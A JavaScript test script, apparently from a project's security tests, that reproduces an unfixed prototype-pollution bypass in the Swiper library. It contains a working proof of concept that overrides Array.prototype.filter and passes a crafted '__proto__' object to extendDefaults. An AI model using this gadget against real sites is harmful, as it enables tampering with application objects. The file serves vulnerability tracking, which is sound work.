/**
 * RESIDUAL-VULNERABILITY REPRODUCTION — not a pass/fail security test.
 *
 * This file demonstrates that a KNOWN, CURRENTLY UNFIXED weakness is still present in
 * the vendored bundle. Exit 0 means "still vulnerable, as recorded". It never means
 * "Swiper is safe", and it must not be read as a gate that proves anything about the
 * application's security posture.
 *
 * Run at every Swiper upgrade:
 *   node tests/swiper_prototype_pollution_check.mjs
 *
 * Background. CVE-2026-27212 / GHSA-hmx5-qpq5-p643 was that Swiper's `extend()`
 * filtered __proto__ / constructor / prototype through Array.prototype.indexOf —
 * override that one method and the guard falls. 12.1.2 replaced indexOf with three
 * direct string comparisons, and the advisory lists the issue as fixed there.
 *
 * It is not fixed. The direct comparisons are the CALLBACK to an equally overridable
 * Array.prototype.filter:
 *
 *     Object.keys(Object(a)).filter(e => "__proto__" !== e && ... )
 *
 * Replace filter and the callback never runs. Upstream issue 8189 is open and current
 * upstream master still carries the pattern, so NO FIXED UPSTREAM RELEASE IS IDENTIFIED
 * as of 2026-07-26 — including npm's latest 14.0.6, independently reproduced. Recorded,
 * not remediated, exactly as Leaflet 1.9.4 / CVE-2025-69993 is (documentation/
 * DEPENDENCIES.md).
 *
 * Prerequisites, stated precisely: prior tampering with Array.prototype.filter AND a
 * crafted object reaching Swiper's merge path. MarkerVault passes only fixed literal
 * option objects (frontend.js) and routes no remote input into extendDefaults, so
 * there is no identified attacker-controlled path to the second prerequisite — making
 * application exploitability UNCONFIRMED rather than proven absent. Script execution
 * is one sufficient route to the first prerequisite, not a necessary one; do not
 * describe this as "requires XSS".
 *
 * EXPECTED RESULT TODAY: control blocked, bypass succeeds, exit 0 with
 * "GADGET STILL PRESENT". That is the known state. If the bypass ever stops working,
 * this exits 1 and says so — meaning upstream finally fixed it and the dependency
 * inventory should be updated to match.
 */
import { readFileSync } from 'fs';
import { dirname, resolve } from 'path';
import { fileURLToPath } from 'url';

const here = dirname(fileURLToPath(import.meta.url));
const { chromium } = await import(resolve(here, 'pw-test/node_modules/playwright/index.mjs'));

const bundle = readFileSync(resolve(here, '../public/assets/swiper-bundle.min.js'), 'utf8');

const browser = await chromium.launch();
const page = await browser.newPage();
page.on('pageerror', (error) => console.log('pageerror:', error.message));
await page.setContent('<!doctype html><html><body></body></html>');
await page.addScriptTag({ content: bundle });

const result = await page.evaluate(() => {
    const out = { loaded: typeof window.Swiper !== 'undefined' };
    if (!out.loaded) return out;

    // Control: with an untouched Array.prototype the 12.1.2 guard must hold. JSON.parse
    // is required — an object literal's __proto__ key sets the prototype rather than
    // creating an own property, so a literal would not exercise the guard at all.
    try {
        window.Swiper.extendDefaults(JSON.parse('{"__proto__":{"mvControl":"yes"}}'));
    } catch (error) {
        out.controlError = error.message;
    }
    out.controlPolluted = ({}).mvControl === 'yes';

    // Bypass: neutralize Array.prototype.filter so the guard callback never runs.
    const realFilter = Array.prototype.filter;
    try {
        Array.prototype.filter = function () { return this; };
        try {
            window.Swiper.extendDefaults(JSON.parse('{"__proto__":{"mvBypass":"yes"}}'));
        } catch (error) {
            out.bypassError = error.message;
        }
        out.bypassPolluted = ({}).mvBypass === 'yes';
    } finally {
        // Both prototypes are restored here, not on the happy path: a throw anywhere
        // above must not leave this page with a poisoned Array.prototype or a dirty
        // Object.prototype, or every later measurement in this run is meaningless.
        Array.prototype.filter = realFilter;
        delete Object.prototype.mvControl;
        delete Object.prototype.mvBypass;
    }
    out.cleanedUp = Array.prototype.filter === realFilter
        && ({}).mvControl === undefined
        && ({}).mvBypass === undefined;
    return out;
});

await browser.close();

console.log(`bundle loaded          : ${result.loaded}`);
console.log(`direct guard holds     : ${result.controlPolluted === false}`);
console.log(`filter-override bypass : ${result.bypassPolluted ? 'SUCCEEDS' : 'blocked'}`);
console.log(`prototype restored     : ${result.cleanedUp}`);

if (!result.loaded || !result.cleanedUp) {
    console.log('\nINCONCLUSIVE — the bundle did not load or the prototype was left dirty.');
    process.exit(2);
}
if (result.controlPolluted) {
    console.log('\nREGRESSION — the direct guard itself is gone; this is worse than the known state.');
    process.exit(1);
}
if (result.bypassPolluted) {
    console.log('\nGADGET STILL PRESENT — matches the recorded state (upstream issue 8189 open).');
    process.exit(0);
}
console.log('\nGADGET GONE — upstream appears to have fixed it. Update vendored-assets.json');
console.log('and documentation/DEPENDENCIES.md, which currently record it as unfixed.');
process.exit(1);
